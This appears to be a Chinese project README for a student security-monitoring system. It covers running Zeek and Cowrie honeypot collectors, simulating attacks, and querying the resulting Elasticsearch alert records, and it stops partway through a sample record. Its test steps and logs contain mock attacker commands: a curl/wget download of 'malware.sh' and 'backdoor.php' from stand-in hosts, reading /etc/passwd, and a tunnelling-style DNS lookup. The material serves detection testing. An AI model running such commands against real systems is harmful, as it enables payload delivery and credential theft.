

本文档详细说明了 **Zeek (网络流量)** 与 **Cowrie (蜜罐)** 的采集脚本使用方法、攻击验证步骤及数据输出格式，并针对 **组员 3 (Context)** 和 **组员 4 (Graph)** 提供了数据取用指南。

---

## 📡 1. Zeek 网络流量采集

### 1.1 运行与测试

**启动采集脚本**：

```Bash
python3 /root/TraceX/collector/network_collector/flow_parser_zeek.py
```

**实施攻击 (模拟)**：


```Bash
# 1. DNS 隧道识别
nslookup v9xL7m.QzW4rKj1.N8uT6yA3.bP2wS5h9.xR2tY7uI.oP1aQ3sD.fG5hJ7k.com
# 2. ICMP 隧道识别
ping -s 900 -c 4 114.114.114.114
# 3. HTTP 审计与文件指纹提取
wget --max-redirect=0 http://testphp.vulnweb.com/images/logo.gif
```

**采集端实时输出**：

```Plaintext
[PROCESS][dns.log] 172.26.155.27 -> 100.100.2.136 | DNS隧道检测 [Depth(8)]: v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com [!! ALERT: DNS Tunneling !!]
[PROCESS][conn.log] 172.26.155.27 -> 114.114.114.114 | 疑似 ICMP 隧道告警 [!! ALERT: ICMP Tunneling !!]
[PROCESS][files.log] 172.26.155.27 -> 100.100.18.120 | 网络传输文件: unknown
```

### 1.2 Elasticsearch 数据格式

**索引模式**: `network-flows-*`

#### ✅ 普通日志 (Normal)

_特点：severity 低，detection 为空，无 threat 标签。_

查询 **Severity = 3** 的日志实例：
查询命令：
```Bash
curl -X GET "localhost:9200/network-flows-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "term": {
      "event.severity": 3
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 576,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "network-flows-2026.01.13",
        "_type" : "_doc",
        "_id" : "j7DmuJsBWyb8qg8aDR4H",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "6e36b79f-f29b-4642-a1ac-6558c61584fa",
            "category" : "network",
            "type" : "",
            "action" : "network_flow",
            "outcome" : "",
            "severity" : 3,
            "dataset" : "zeek.ssl"
          },
          "source" : {
            "ip" : "172.26.155.27",
            "port" : 60952,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "100.118.58.9",
            "port" : 443,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              "172.26.155.27"
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "",
            "executable" : "",
            "command_line" : "",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "ssl",
            "transport" : "",
            "application" : "TLSv12",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "",
              "name" : ""
            }
          },
          "message" : "SSL/TLS Handshake: TLSv12",
          "raw" : {
            "ts" : 1.768333641791594E9,
            "uid" : "CZSnvm20HfuEnMASBl",
            "id.orig_h" : "172.26.155.27",
            "id.orig_p" : 60952,
            "id.resp_h" : "100.118.58.9",
            "id.resp_p" : 443,
            "version" : "TLSv12",
            "cipher" : "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
            "curve" : "x25519",
            "server_name" : "cw0787unoa1jic8zbhrm0.oss-cn-beijing-internal.aliyuncs.com",
            "resumed" : false,
            "established" : true,
            "ssl_history" : "CsxknGIi",
            "cert_chain_fps" : [
              "65629fa353ea8b6dc8839381b2e6437de3975c775e01c1a5293ace5c620ad377",
              "996bb81f161e1dac9a3939ab7a42b4131d6dcfbe6e0da4b5a6e19b5c8701842a",
              "445eec78bc61215044a0379656aa2d5db5e42f76cb70b8d14c2077aa943d4ebb"
            ],
            "client_cert_chain_fps" : [ ],
            "sni_matches_cert" : true
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [ ],
            "confidence" : 0.0,
            "severity" : ""
          },
          "@timestamp" : "2026-01-13T19:47:21.791594Z"
        },
        "sort" : [
          1768333641791
        ]
      }
    ]
  }
}
```

#### 🚨 告警日志 (Alert)

_特点：severity >= 7，包含 detection 规则与 threat 标签。_

查询 **DNS Tunneling** 告警日志实例：
查询命令：
```Bash
curl -X GET "localhost:9200/network-flows-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "match_phrase": { "threat.technique.name": "DNS Tunneling" } },
        { "term": { "event.severity": 7 } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
root@iZ2ze082hzl5s9xfijazalZ:~/TraceX# curl -X GET "localhost:9200/network-flows-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "match_phrase": { "threat.technique.name": "DNS Tunneling" } },
        { "term": { "event.severity": 7 } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
{
  "took" : 14,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 4,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "network-flows-2026.01.13",
        "_type" : "_doc",
        "_id" : "J7DkuJsBWyb8qg8aPh3l",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "43fb4d6e-ed95-4f81-a409-1689f85e3eee",
            "category" : "network",
            "type" : "",
            "action" : "network_flow",
            "outcome" : "",
            "severity" : 7,
            "dataset" : "zeek.dns"
          },
          "source" : {
            "ip" : "172.26.155.27",
            "port" : 44655,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "100.100.2.136",
            "port" : 53,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              "172.26.155.27"
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "",
            "executable" : "",
            "command_line" : "",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "dns",
            "transport" : "udp",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "T1071.004",
              "name" : "DNS Tunneling"
            }
          },
          "message" : "DNS隧道检测 [Depth(8)]: v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com",
          "raw" : {
            "ts" : 1.768333523181635E9,
            "uid" : "CzB6u21usUv8CEt8Rg",
            "id.orig_h" : "172.26.155.27",
            "id.orig_p" : 44655,
            "id.resp_h" : "100.100.2.136",
            "id.resp_p" : 53,
            "proto" : "udp",
            "trans_id" : 3682,
            "query" : "v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com",
            "qclass" : 1,
            "qclass_name" : "C_INTERNET",
            "qtype" : 1,
            "qtype_name" : "A",
            "rcode" : 3,
            "rcode_name" : "NXDOMAIN",
            "AA" : false,
            "TC" : false,
            "RD" : true,
            "RA" : false,
            "Z" : 0,
            "rejected" : false
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [
              "DNS Anomaly: Depth(8)"
            ],
            "confidence" : 0.9,
            "severity" : "high"
          },
          "@timestamp" : "2026-01-13T19:45:23.181635Z"
        },
        "sort" : [
          1768333523181
        ]
      }
    ]
  }
}
```

查询 **ICMP Tunneling** 告警日志实例：
查询命令：
```Bash
curl -X GET "localhost:9200/network-flows-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "match": { "threat.technique.name": "ICMP Tunneling" } },
        { "term": { "event.severity": 7 } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```Json
{
  "took" : 1,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 5,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "network-flows-2026.01.13",
        "_type" : "_doc",
        "_id" : "C7DluJsBWyb8qg8aaB6m",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "045cc47d-774c-4190-b150-2020214f9465",
            "category" : "network",
            "type" : "",
            "action" : "network_flow",
            "outcome" : "",
            "severity" : 7,
            "dataset" : "zeek.conn"
          },
          "source" : {
            "ip" : "172.26.155.27",
            "port" : 8,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "114.114.114.114",
            "port" : 0,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              "172.26.155.27"
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "",
            "executable" : "",
            "command_line" : "",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "icmp",
            "transport" : "",
            "application" : "",
            "bytes" : 3600,
            "packets" : 4,
            "direction" : ""
          },
          "user" : {
            "name" : "",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "T1071.004",
              "name" : "ICMP Tunneling"
            }
          },
          "message" : "疑似 ICMP 隧道告警",
          "raw" : {
            "ts" : 1.768333535643556E9,
            "uid" : "C4noiQ38fGtpjsGV9",
            "id.orig_h" : "172.26.155.27",
            "id.orig_p" : 8,
            "id.resp_h" : "114.114.114.114",
            "id.resp_p" : 0,
            "proto" : "icmp",
            "duration" : 3.0609209537506104,
            "orig_bytes" : 3600,
            "resp_bytes" : 0,
            "conn_state" : "OTH",
            "local_orig" : true,
            "local_resp" : false,
            "missed_bytes" : 0,
            "orig_pkts" : 4,
            "orig_ip_bytes" : 3712,
            "resp_pkts" : 0,
            "resp_ip_bytes" : 0,
            "ip_proto" : 1
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [
              "Large ICMP Payload"
            ],
            "confidence" : 0.8,
            "severity" : "high"
          },
          "@timestamp" : "2026-01-13T19:45:35.643556Z"
        },
        "sort" : [
          1768333535643
        ]
      }
    ]
  }
}
```

查询 **HTTP 文件传输**日志实例：
查询代码：
```Bash
curl -X GET "localhost:9200/network-flows-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "term": {
      "event.dataset": "zeek.files"
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 1,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 10,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "network-flows-2026.01.13",
        "_type" : "_doc",
        "_id" : "ebDluJsBWyb8qg8a6h5h",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "47534455-79d9-4787-aee8-1475378cc10b",
            "category" : "file",
            "type" : "",
            "action" : "network_flow",
            "outcome" : "",
            "severity" : 3,
            "dataset" : "zeek.files"
          },
          "source" : {
            "ip" : "172.26.155.27",
            "port" : 44456,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "100.100.18.120",
            "port" : 80,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              "172.26.155.27"
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "",
            "executable" : "",
            "command_line" : "",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "unknown",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "",
            "transport" : "",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "",
              "name" : ""
            }
          },
          "message" : "网络传输文件: unknown",
          "raw" : {
            "ts" : 1.768333633499367E9,
            "fuid" : "Fwzepf3zKkolda6dfg",
            "uid" : "Cp9fsa3HOTjQhALEb",
            "id.orig_h" : "172.26.155.27",
            "id.orig_p" : 44456,
            "id.resp_h" : "100.100.18.120",
            "id.resp_p" : 80,
            "source" : "HTTP",
            "depth" : 0,
            "analyzers" : [ ],
            "mime_type" : "text/json",
            "duration" : 0.0,
            "local_orig" : true,
            "is_orig" : false,
            "seen_bytes" : 102,
            "missing_bytes" : 0,
            "overflow_bytes" : 0,
            "timedout" : false
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [ ],
            "confidence" : 0.0,
            "severity" : ""
          },
          "@timestamp" : "2026-01-13T19:47:13.499367Z"
        },
        "sort" : [
          1768333633499
        ]
      }
    ]
  }
}
```

---

## 🍯 2. Cowrie 蜜罐采集 (v5.1 APT 审计版)

### 2.1 运行与测试

**启动采集脚本**：

```Bash
python3 /root/TraceX/collector/network_collector/flow_parser_cowrie.py
```

**实施攻击 (完整 APT 攻击链)**：

```Bash
# 1. 登录 (弱密码: 123456)
ssh root@182.92.114.32 -p 2222

# 2. 执行恶意操作
# 下载工具
curl http://evil.com/malware.sh
wget http://1.2.3.4/backdoor.php
# 敏感信息搜集
cat /etc/passwd
whoami
# 痕迹清除
touch /tmp/evidence.txt
rm /tmp/evidence.txt
mv /etc/hosts /tmp/hosts.bak
# 退出
exit
```

**采集端实时输出 (完整链条展示)**：

```Plaintext
root@iZ2ze082hzl5s9xfijazalZ:~/TraceX# python3 /root/TraceX/collector/network_collector/flow_parser_cowrie.py
[*] Cowrie 蜜罐解析器 v5.1 启动 (Schema v4.0)
[*] 审计模式: 监听 APT 命令 (curl/wget/mv) 与 暴力破解
[HONEYPOT] 59.64.129.102 | cowrie.session.connect -> New connection: 59.64.129.102:4709 (172.20.0.100:2222) [session: 7cae5878c418]
[HONEYPOT] 59.64.129.102 | cowrie.login.success -> login attempt [root/123456] succeeded
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: curl http://evil.com/malware.sh [!! ALERT: Ingress Tool Transfer !!]
[HONEYPOT] 59.64.129.102 | cowrie.session.file_download -> Downloaded URL (http://evil.com/malware.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: wget http://1.2.3.4/backdoor.php [!! ALERT: Ingress Tool Transfer !!]
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: cat /etc/passwd [!! ALERT: Account Discovery !!]
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: whoami [!! ALERT: Account Discovery !!]
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: touch /tmp/evidence.txt
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: rm /tmp/evidence.txt
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: mv /etc/hosts /tmp/hosts.bak
[HONEYPOT] 59.64.129.102 | cowrie.command.input -> CMD: exit
```

**操作分级解读**
- **`curl/wget` (Sev 8)**: 下载木马。这是**最高危**动作，必须马上告警（Alert）。
- **`cat /etc/passwd` (Sev 7)**: 窃取核心凭据。这是**高危**动作，必须告警（Alert）。
- **`rm /tmp/evidence.txt` (Sev 6)**: 删除文件。这属于“清除痕迹”（T1070），确实是攻击行为，但也可以是正常维护。所以你在代码里给它定义的严重级是 **6**。
    - **结果**：它被记录进了 Elasticsearch，带有 T1070 标签，**但是**为了避免刷屏，控制台没有把它标红。这是为了防止告警疲劳。
- **`touch` / `exit` (Sev 5/3)**: 这些是辅助操作，本身威胁度很低，不需要告警，只需要记录。

### 2.2 Elasticsearch 数据格式

**索引模式**: `honeypot-logs-*`

#### 🔗 登录事件 (Login Success)

查询命令：
```Bash
curl -X GET "localhost:9200/honeypot-logs-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "term": { "event.category": "authentication" } },
        { "term": { "event.outcome": "success" } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 357,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 2,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "honeypot-logs-2026.01.13",
        "_type" : "_doc",
        "_id" : "tbD6uJsBWyb8qg8aKFsD",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "93ce0733-b621-43b0-a94a-ba67d95d5948",
            "category" : "authentication",
            "type" : "info",
            "action" : "success",
            "outcome" : "success",
            "severity" : 1,
            "dataset" : "cowrie"
          },
          "source" : {
            "ip" : "59.64.129.102",
            "port" : 0,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "",
            "port" : 2222,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              ""
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "",
            "executable" : "",
            "command_line" : "",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "",
            "transport" : "",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "root",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "",
              "name" : ""
            }
          },
          "message" : "login attempt [root/123456] succeeded",
          "raw" : {
            "eventid" : "cowrie.login.success",
            "username" : "root",
            "password" : "123456",
            "message" : "login attempt [root/123456] succeeded",
            "sensor" : "19b4c34a5a8a",
            "timestamp" : "2026-01-13T20:09:20.358912Z",
            "src_ip" : "59.64.129.102",
            "session" : "7cae5878c418"
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [ ],
            "confidence" : 0.0,
            "severity" : ""
          },
          "@timestamp" : "2026-01-13T20:09:20.358912Z"
        },
        "sort" : [
          1768334960358
        ]
      }
    ]
  }
}
```

#### 🚨 命令审计 (Command)

**查询 APT 工具下载告警**（用于展示 `curl` 或 `wget` 下载恶意脚本的行为，这是攻击链的第二步）
查询命令：
```Bash
curl -X GET "localhost:9200/honeypot-logs-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "match": { "threat.technique.name": "Ingress Tool Transfer" } },
        { "range": { "event.severity": { "gte": 7 } } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 0,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 4,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "honeypot-logs-2026.01.13",
        "_type" : "_doc",
        "_id" : "uLD6uJsBWyb8qg8aU1sN",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "a34ee39e-5520-4ecf-a9f4-aa11eabdec15",
            "category" : "process",
            "type" : "info",
            "action" : "input",
            "outcome" : "success",
            "severity" : 8,
            "dataset" : "cowrie"
          },
          "source" : {
            "ip" : "59.64.129.102",
            "port" : 0,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "",
            "port" : 2222,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              ""
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "wget",
            "executable" : "",
            "command_line" : "wget http://1.2.3.4/backdoor.php",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "",
            "transport" : "",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "unknown",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "T1105",
              "name" : "Ingress Tool Transfer"
            }
          },
          "message" : "CMD: wget http://1.2.3.4/backdoor.php",
          "raw" : {
            "eventid" : "cowrie.command.input",
            "input" : "wget http://1.2.3.4/backdoor.php",
            "message" : "CMD: wget http://1.2.3.4/backdoor.php",
            "sensor" : "19b4c34a5a8a",
            "timestamp" : "2026-01-13T20:09:31.334445Z",
            "src_ip" : "59.64.129.102",
            "session" : "7cae5878c418"
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [
              "Suspicious Downloader (curl/wget)"
            ],
            "confidence" : 1.0,
            "severity" : "high"
          },
          "@timestamp" : "2026-01-13T20:09:31.334445Z"
        },
        "sort" : [
          1768334971334
        ]
      }
    ]
  }
}
```

**查询敏感信息搜集告警**（用于展示 `cat /etc/passwd` 等行为，这是攻击链的第三步）
查询命令：
```Bash
curl -X GET "localhost:9200/honeypot-logs-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        { "match": { "threat.technique.name": "Account Discovery" } }
      ]
    }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 1,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 4,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "honeypot-logs-2026.01.13",
        "_type" : "_doc",
        "_id" : "urD6uJsBWyb8qg8alVuE",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "c22d4731-9eed-4c08-88c1-85edcf414ae2",
            "category" : "process",
            "type" : "info",
            "action" : "input",
            "outcome" : "success",
            "severity" : 7,
            "dataset" : "cowrie"
          },
          "source" : {
            "ip" : "59.64.129.102",
            "port" : 0,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "",
            "port" : 2222,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              ""
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "whoami",
            "executable" : "",
            "command_line" : "whoami",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "",
            "transport" : "",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "unknown",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "T1087",
              "name" : "Account Discovery"
            }
          },
          "message" : "CMD: whoami",
          "raw" : {
            "eventid" : "cowrie.command.input",
            "input" : "whoami",
            "message" : "CMD: whoami",
            "sensor" : "19b4c34a5a8a",
            "timestamp" : "2026-01-13T20:09:48.442556Z",
            "src_ip" : "59.64.129.102",
            "session" : "7cae5878c418"
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [
              "Sensitive File Access"
            ],
            "confidence" : 0.9,
            "severity" : "medium"
          },
          "@timestamp" : "2026-01-13T20:09:48.442556Z"
        },
        "sort" : [
          1768334988442
        ]
      }
    ]
  }
}
```

**查询痕迹清除行为**（用于展示 `rm` 或 `mv` 等行为，这是攻击链的最后一步）
查询命令：
```Bash
curl -X GET "localhost:9200/honeypot-logs-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match": { "process.command_line": "rm" }
  },
  "size": 1,
  "sort": [{ "@timestamp": "desc" }]
}'
```
结果：
```JSON
{
  "took" : 0,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 2,
      "relation" : "eq"
    },
    "max_score" : null,
    "hits" : [
      {
        "_index" : "honeypot-logs-2026.01.13",
        "_type" : "_doc",
        "_id" : "vLD6uJsBWyb8qg8avFuf",
        "_score" : null,
        "_source" : {
          "event" : {
            "id" : "c27def8e-73c9-44d1-9d7d-97ba86ffabf6",
            "category" : "process",
            "type" : "info",
            "action" : "input",
            "outcome" : "success",
            "severity" : 6,
            "dataset" : "cowrie"
          },
          "source" : {
            "ip" : "59.64.129.102",
            "port" : 0,
            "mac" : "",
            "geo" : {
              "country_name" : "",
              "city_name" : "",
              "location" : {
                "lat" : 0.0,
                "lon" : 0.0
              }
            }
          },
          "destination" : {
            "ip" : "",
            "port" : 2222,
            "mac" : ""
          },
          "host" : {
            "name" : "iZ2ze082hzl5s9xfijazalZ",
            "hostname" : "",
            "ip" : [
              ""
            ],
            "os" : {
              "family" : "",
              "name" : "",
              "version" : ""
            }
          },
          "process" : {
            "pid" : 0,
            "name" : "rm",
            "executable" : "",
            "command_line" : "rm /tmp/evidence.txt",
            "parent" : {
              "pid" : 0,
              "name" : "",
              "executable" : ""
            },
            "user" : {
              "name" : "",
              "id" : ""
            },
            "start_time" : ""
          },
          "file" : {
            "path" : "",
            "name" : "",
            "extension" : "",
            "size" : 0,
            "hash" : {
              "md5" : "",
              "sha256" : ""
            }
          },
          "network" : {
            "protocol" : "",
            "transport" : "",
            "application" : "",
            "bytes" : 0,
            "packets" : 0,
            "direction" : ""
          },
          "user" : {
            "name" : "unknown",
            "id" : "",
            "domain" : ""
          },
          "threat" : {
            "framework" : "MITRE ATT&CK",
            "tactic" : {
              "id" : "",
              "name" : ""
            },
            "technique" : {
              "id" : "T1070",
              "name" : "Indicator Removal"
            }
          },
